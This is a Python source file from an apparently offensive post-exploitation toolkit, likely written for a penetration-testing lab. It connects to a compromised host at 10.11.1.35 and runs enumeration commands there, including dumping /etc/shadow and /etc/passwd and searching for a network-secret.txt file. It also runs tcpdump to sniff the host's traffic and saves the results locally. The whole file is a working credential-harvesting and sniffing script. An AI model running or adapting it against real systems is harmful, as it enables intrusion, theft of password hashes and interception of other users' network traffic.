#!/usr/bin/env python
import pexpect
import re
import subprocess
import time
import urllib
import base64
import shutil
import os
import threading
import datetime

from app.util import webutil, fileutil
from app.probe import connect

DEBUG=True

def debug(msg):
	if(DEBUG):
		print(msg)

def error(msg):
	print msg

def writeFile(host, filename, content):
	path=os.path.join(fileutil.getLocalOutPath(), host)
	path= os.path.join(fileutil.mkdir(path), filename) #ensure existance of directory
	print "PRINTING TO " + path
	fileutil.writeTo(path, content)

###Post
def extract(host):
	t = threading.Thread(target=wiretap, args=(host,250) )
	t.start()

	getLocalInfo(host)
	t.join()

def getLocalInfo(host):

	tests = [
		{	"name" : "uname", 		"cmd":"uname -a"			},
		{	"name" : "id", 			"cmd":"id"					},
		{	"name" : "version", 	"cmd":"cat /proc/version"	},
		{	"name" : "issue", 		"cmd":"cat /etc/issue"		},
		{	"name" : "ifconfig",	"cmd":"ifconfig -a"			},
		{	"name" : "netstat", 	"cmd":"netstat -ano"		},
		{	"name" : "etc_contents","cmd":"ls /etc/"			},
		{	"name" : "passwd", 		"cmd":"cat /etc/passwd"		},
		{	"name" : "groups", 		"cmd":"cat /etc/group"		},
		{	"name" : "shadow", 		"cmd":"cat /etc/shadow"		},
		{	"name" : "hosts", 		"cmd":"cat /etc/hosts"		},
		{	"name" : "arp", 		"cmd":"arp -a"				},
		{	"name" : "iptables", 	"cmd":"iptables -L"			},
		{	"name" : "crontab", 	"cmd":"crontab -l"			},
		{	"name" : "network_secret", "cmd":"find . -name \"network-secret.txt\""},
		{	"name" : "bin_contents", "cmd":"ls /usr/bin/"		},
		{	"name" : "sbin_contents","cmd":"ls /usr/sbin/"		},
	]

	proc = connect.connect(host)

	for i in range(0,len(tests)-1):
		connect.send(proc, "###" + tests[i]["name"].strip() + "###")
		connect.send(proc, tests[i]["cmd"].strip())
	connect.send(proc, "exit")
	output = proc.read()
	writeFile(host, "local_extract.txt".format(datetime.datetime.now().isoformat().replace(":","_")), output)


def wiretap(host, packet_limit = 250, timeout=connect.RESPONSE_TIMEOUT_IDLE, verbose=False):
	expected = "dropped by kernel"

	proc = connect.connect(host)
	cmd = "tcpdump -q -c {1} -n -i eth0 not arp and src not  {0} and dst not {0}".format(webutil.getLocalHostName(), packet_limit)
	if verbose:
		cmd = "tcpdump -vvv -c {1} -n -i eth0 not arp and src not  {0} and dst not {0}".format(webutil.getLocalHostName(), packet_limit)

	debug("WIRETAP: " + cmd)
	try:
		connect.send(proc,cmd, timeout=connect.RESPONSE_TIMEOUT_IDLE)
		connect.checkConnection(proc, timeout=connect.RESPONSE_TIMEOUT_IDLE)
		writeFile(host, "wiretap.{0}.txt".format(datetime.datetime.now().isoformat().replace(":","_")), proc.before)	
	except:
		error("Error while waiting for wiretap to finish")
		raise
	return proc

if __name__ == "__main__":
	extract("10.11.1.35")




